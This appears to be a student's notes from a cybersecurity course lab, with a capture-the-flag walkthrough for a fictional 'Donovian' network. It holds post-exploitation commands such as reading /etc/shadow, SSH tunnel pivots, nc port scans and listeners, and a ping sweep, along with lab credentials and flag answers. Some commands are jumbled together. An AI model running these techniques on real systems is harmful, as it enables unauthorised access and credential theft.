## CCTC Security Day 8
- agenda

## Admin Data 

### CTFd info FOR UPDATED CTF
| Field | Value | 
|-|-|
| Stack # | 10 | 
| Username | JAMO-005-B |  
| Password | YdY8vrRGOsRfhy6 |
| lin.internet | 10.50.21.133 |
|Linux ops | 192.168.65.20, 10.50.27.132|
| Windos Ops | 1192.168.65.10, 10.50.26.107|

***
### Post Exploitation

## Linux
- see etc shadow:
    - `cd /etc`
    - `sudo cat shadow`
    - ` cat pwd` - usernames
    - `sudo cat rsyslog.conf`
    - `cat hosts` - 
    - `cat crontab` - current user or -l for more 

- `sudo -l` showd all the commands that user can do with sudo 
- `whoami` - current user
- `groups` groups 
- `find / -perm /4000` (not needed for today I guess? )
- `w` and `who` looks at all logged in users on box, and what they've been up to 
- `ps -aux` (unix way), essentially the same as -l 
- `pstree` - shows breakdown of all processes 
- `lsb_release -a` and `cat os-release` show version of operating system 
- `service --status-all` - shows all services and what's on/off
- `systemctl --all` - shows
- `systemctl status` 
# **`hostname`** - super important, shows what computer you are on for test

***
## Windows

- use **system information**, **Computer management** (see groups)
- task scheduler 
- registry run/runonce keys
- services (look for empty description)
- file efor i in {1..254} ;do (ping -c 1 192.168.$i.9 | grep "bytes from" &) ;done
ed `%temp

%` into file address. --> AppData --> Roaming
        - `C:\Users\student\AppData\Local\Temp`
        - `C:\Users\student\AppData\Roaming` can also get there with `%appdata%`
    - `hiden file, 
    - programfiles 
    - programdata
    - Programfiles(x86)
- Even viewer (windows logging)

***
Order of challenges:
extranet --> intranet (intranet 4 is talking about a security product) --> internal 
***
### CTF Challenges
Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student.

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>internet_grey_host
->T1: 192.168.28.100
--->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds: comrade :: StudentMidwayPassword
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

1. Extranet

Utilizing the intelligence provided, enumerate the target provided. Look for user generated documents, relating to network structure, on this host that will direct further actions.

        - get on comrade, cd desktop --> network.
        - `scp map.png student@xfreerdp /v:localhost:43300 /u:comrade /p:StudentMidwayPassword /size:1000x1000 +clipboard10.50.21.133:/home/student`  onto jump box --> get it onto lin-ops `scp map.png student@10.50.27.132:/home/student`
        - install gimp
        - open map.png
        - see 192.168.X.0/27
        - look around network directory for hidden files --> .mapkey.txt
        - zzcNTsGG3zwD7QjHrfho

2. Extranet 2

The Donovian government is furthering their inventory expansion project. Identify and locate this intel to support this.

        - on comrade, get to home directory, then usr/share --> equip-inventory.txt --> wDsibI1AjiIjhC0XqBHV (decoded)

3. Intranet (3201)

Enumerate all network items, relating to name resolution

                - get onto comrade, cat /etc/hosts -->  192.168.150.253 (Donovian Intranet)
                - `ssh 10.50.21.133 -L 42200:192.168.28.100:2222 -NT` create tunnel from jumpbox to comrade ssh
                - ssh from comrade box to intranet `ssh -p 3201 192.168.150.253` 
                - `etc/ --> cat hosts --> yslO1mUMzvL3zLAbHnYP`
4. Intranet 2

Enumerate all network items related to syslog and rsyslog

                - In intranet still --> etc/rsyslog.d --> cat 50-default.conf
                - IVEUFtIY7CHhKepQ44mE

5. Intranet 3

Enumerate user directories on the machine. Find artifacts of malicious intent. You might need higher privileges...


                - sudo cat root/brootkit/brootkit-master/br.conf
                - qVnoUiQnILVbd0iEEuEX
6. Intranet 4

Enumerate for security products that may be installed on the system

        - /etc --> cat rkhunter.conf --> ylD7PRFfWRIcOslLlJy7
7. Intranet 5

Enumerate information related to the users on this system

        - cd /etc --> sudo cat shadow --> 266nuHJ9vznLyRDmrGVh

8. Intranet 6

Enumerate items that would be related to jobs and tasks that running on the host, you may need to use higher privileges.

- look for individual user cron, like root --> sudo su root then crontab -l --> CUt2Eyl7D9XNESsPaoJ4'

9. Intranet 7

Find the beacon being received by the intranet host and determine how to interact with it 

                - sudo tcpdump  port not 3201
                - see 192.168.28.135 12314 is often conneting to intranet
                - fix nc --> sudo tcpdump  port not 3201
  171  sudo ncat -v -n 192.168.28.135 1-2034
  172  ncat -v -n 192.168.28.135 1-2034
  173  nc -v -n 192.168.28.135 1-2034
  174  ls -l /bin/nc
  175  ls -l /etc/alternatives/nc
  176  ls -l /bin/nc.openbsd
  177  chmod +x /bin/nc.openbsd
  178  sudo chmod +x /bin/nc.openbsd
  179  nc -v -n 192.168.28.135 1-2034
  180  nc -lvnp 12315

S1RCQ09INUhFTDA5a3lUT0g2STIK --> base64 decode --> c
KTBCOH5HEL09kyTOH6I2

10. Internal

- ssh comrade@localhost -p 42200 -L 43300:192.168.28.9:3389 -NT

- xfreerdp /v:localhost:43300 /u:comrade /p:StudentMidwayPassword /size:1000x1000 +clipboard

- documents --> generalstaz --> donovian battle brief --> 6LN1QJV0Y9GCcExi4Caz

11. Internal 2

gorgas missle plan --> FdRE8A1nILw8OYVdgp3a


12. Internal 3
regedit --> Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> checkin--> modify --> 
ZZ8hMWRIYRCMisJ777kE